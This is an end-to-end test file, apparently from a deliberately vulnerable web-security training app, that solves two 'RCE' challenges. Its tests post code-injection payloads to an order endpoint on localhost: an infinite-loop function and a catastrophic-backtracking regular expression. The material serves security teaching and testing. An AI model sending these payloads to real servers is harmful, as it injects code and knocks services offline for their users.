const config = require('config')

describe('/b2b/v2/order', () => {
  protractor.beforeEach.login({ email: 'admin@' + config.get('application.domain'), password: '***REMOVED***' })

  describe('challenge "rce"', () => {
    it('an infinite loop deserialization payload should not bring down the server', () => {
      browser.waitForAngularEnabled(false)
      browser.executeScript('var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.status == 500) { console.log("Success"); }}; xhttp.open("POST","http://localhost:3000/b2b/v2/orders/", true); xhttp.setRequestHeader("Content-type","application/json"); xhttp.setRequestHeader("Authorization",`Bearer ${localStorage.getItem("token")}`); xhttp.send(JSON.stringify({"orderLinesData": "(function dos() { while(true); })()"}));') // eslint-disable-line
      browser.driver.sleep(1000)
      browser.waitForAngularEnabled(true)
    })

    protractor.expect.challengeSolved({ challenge: 'RCE Tier 1' })
  })

  describe('challenge "rceOccupy"', () => {
    it('should be possible to cause request timeout using a recursive regular expression payload', () => {
      browser.waitForAngularEnabled(false)
      browser.executeScript('var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.status == 503) { console.log("Success"); }}; xhttp.open("POST","http://localhost:3000/b2b/v2/orders/", true); xhttp.setRequestHeader("Content-type","application/json"); xhttp.setRequestHeader("Authorization",`Bearer ${localStorage.getItem("token")}`); xhttp.send(JSON.stringify({"orderLinesData": "/((a+)+)b/.test(\'aaaaaaaaaaaaaaaaaaaaaaaaaaaaa\')"}));') // eslint-disable-line
      browser.driver.sleep(3000) // 2sec for the deserialization timeout plus 1sec for Angular
      browser.waitForAngularEnabled(true)
    })

    protractor.expect.challengeSolved({ challenge: 'RCE Tier 2' })
  })
})
